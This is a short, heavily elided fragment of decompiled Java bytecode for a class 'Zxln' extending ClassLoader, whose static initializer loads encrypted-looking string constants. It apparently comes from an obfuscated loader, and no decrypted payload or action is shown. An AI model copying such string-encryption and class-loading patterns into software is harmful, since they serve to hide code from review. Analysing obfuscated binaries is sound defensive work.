...
class Zxln extends ClassLoader {
  ...
  static {
    ...
    //   7: iconst_0
    //   8: istore_3
    //   9: ldc 'Ì»ßæ\\b»wÞV2URù¨kÃaR¬/%OûK:°Ç\\tl\\nTÁsKé\\t$)]¥RÇ0`MÅ\\bp¬ÊDÈî0ò×!a¬ÁjAI!]´4/éØoÅ´Ø&Ï|ÙúldöAë}¹åzl5`½À?éwÃ:* §oÕ¿¶vâZÄc\\n5NË»~c|ÑfæW§#ß«\\t$ê]ÝRÈ$u='
    //   11: dup
    //   12: astore_2
    ...
    //   64: istore_1
    //   65: goto -> 23
    //   68: ldc 'Oaèv­ázÔ¨8m²c%ðú×­¬.i.£ ¯Ií\\tYK×¡«7äÏ,KX¤³j@t©uµáà&³cw°8a{dsy\\t5Õéªù,'
    //   70: dup
    //   71: astore_2
